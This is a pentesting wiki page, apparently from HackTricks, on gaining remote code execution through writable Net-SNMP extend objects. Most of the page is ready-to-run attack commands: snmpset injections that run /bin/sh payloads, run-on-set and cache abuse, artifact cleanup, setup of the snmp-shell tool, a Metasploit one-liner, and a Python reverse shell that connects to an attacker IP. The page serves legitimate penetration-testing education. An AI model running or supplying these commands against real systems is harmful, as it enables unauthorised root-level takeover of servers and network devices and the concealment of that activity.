---
title: "SNMP RCE"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/network-services-pentesting/pentesting-snmp/snmp-rce.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: network
---

## Quick Triage

Before trying to create a new command, enumerate whether the target already exposes **extend** entries and whether your credentials can read the output objects:

```
snmpwalk -v2c -c <COMMUNITY> <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
snmpwalk -v2c -c <COMMUNITY> <IP> NET-SNMP-EXTEND-MIB::nsExtendOutput1Table
```
Interesting objects to read back are:[\[1\]](#references)

- **`nsExtendCommand`** : absolute path that will be executed
- **`nsExtendArgs`** : arguments passed to the binary/script
- **`nsExtendOutput1Line`** /**`nsExtendOutputFull`** : stdout of the executed command
- **`nsExtendResult`** : exit code of the command (useful for quick checks, but limited to**0-255** )

If local MIBs are missing, the extend subtree is under **`1.3.6.1.4.1.8072.1.3.2`**.

## Extending Services with Additional Commands

To extend SNMP services and add extra commands, it is possible to append new **rows to the `nsExtendObjects` table**. This can be achieved by using the `snmpset` command and providing the necessary parameters, including the absolute path to the executable and the command to be executed:[\[2\]](#references)

```
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```
## Injecting Commands for Execution

Injecting commands to run on the SNMP service requires the existence and executability of the called binary/script. The **`NET-SNMP-EXTEND-MIB`** mandates providing the absolute path to the executable.

To confirm the execution of the injected command, the `snmpwalk` command can be used to enumerate the SNMP service. The **output will display the command and its associated details**, including the absolute path:[\[2\]](#references)

```
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
## Running the Injected Commands

When the **injected command is read, it is executed**. This behavior is known as **`run-on-read()`**. The execution of the command can be observed during the `snmpwalk` read.[\[2\]](#references)

A practical pattern is to execute `/bin/sh` (or `/usr/bin/python3`) and pass the real payload in `nsExtendArgs`:

```
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c SuP3RPrivCom90 10.129.2.26 \
'nsExtendStatus."id"' = createAndGo \
'nsExtendCommand."id"' = /bin/sh \
'nsExtendArgs."id"' = '-c id'
snmpget -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendOutputFull."id"
snmpget -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendResult."id"
```
## `run-on-set` and Cache Abuse

`run-on-set` and Cache Abuse
Net-SNMP also supports **`run-on-set`** entries. This is useful if you want to avoid triggering the command every time somebody performs a read on the output objects.[\[1\]](#references)

```
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c SuP3RPrivCom90 10.129.2.26 \
'nsExtendStatus."oneshot"' = createAndGo \
'nsExtendCommand."oneshot"' = /bin/sh \
'nsExtendArgs."oneshot"' = '-c id > /tmp/snmp_id' \
'nsExtendRunType."oneshot"' = run-on-set
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c SuP3RPrivCom90 10.129.2.26 \
'nsExtendRunType."oneshot"' = run-command
```
The output is cached by default for **5 seconds**. Newly created rows are **`volatile`** by default (they do not survive agent restarts), while statically configured `extend` entries usually appear as **`permanent`**. Setting **`nsExtendCacheTime`** to **`-1`** disables caching, but note that reading each individual output object can then execute the command again.[\[1\]](#references)

```
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c SuP3RPrivCom90 10.129.2.26 \
'nsExtendCacheTime."oneshot"' = -1
```
## Cleanup

The created row can be removed after execution to reduce artifacts:

```
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c SuP3RPrivCom90 10.129.2.26 \
'nsExtendStatus."oneshot"' = destroy
```
## Gaining Server Shell with SNMP

To gain control over the server and obtain a server shell, a python script developed by mxrch can be utilized from [**https://github.com/mxrch/snmp-shell**](https://github.com/mxrch/snmp-shell).[\[2\]](#references)

Alternatively, a reverse shell can be manually created by injecting a specific command into SNMP. This command, triggered by the `snmpwalk`, establishes a reverse shell connection to the attacker’s machine, enabling control over the victim machine.
You can install the pre-requisite to run this:

```
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```
Interactive-ish shell:

```
rlwrap python3 shell.py <IP> -c <COMMUNITY>
```
If you need to push a longer payload (for example, an SSH public key), the project also ships a **`legacy.py`** helper because writable SNMP string length is usually the limiting factor.

Or a reverse shell:

```
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
## Other Useful Tooling

Metasploit contains **`exploit/linux/snmp/net_snmpd_rw_access`**, which automates staging through writable extend objects when the target configuration permits it:[\[4\]](#references)

```
msfconsole -q -x 'use exploit/linux/snmp/net_snmpd_rw_access; set RHOSTS <IP>; set COMMUNITY <COMMUNITY>; run'
```
## Recent Real-World Example

This is still a current attack path and not only an old lab trick. In **June 2024**, Pierre Kim documented **pre-authenticated root RCE** in multiple Toshiba MFP models because they exposed SNMP configuration with default communities (`public` for RO and `private` for RW), allowing the exact same **`NET-SNMP-EXTEND-MIB`** technique to run `/bin/sh -c id` and reverse shells remotely.[\[3\]](#references)

## References

- [1] [NET-SNMP-EXTEND-MIB definition](https://www.net-snmp.org/docs/mibs/NET-SNMP-EXTEND-MIB.txt)
- [2] [Rio Asmara - SNMP Arbitrary Command Execution and Shell](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)
- [3] [Toshiba MFP: 40+ vulnerabilities (pre-auth root RCE via SNMP)](https://pierrekim.github.io/blog/2024-06-27-toshiba-mfp-40-vulnerabilities.html)
- [4] [Rapid7 Metasploit - Net-SNMPd write-access code execution](https://www.rapid7.com/db/modules/exploit/linux/snmp/net_snmpd_rw_access/)
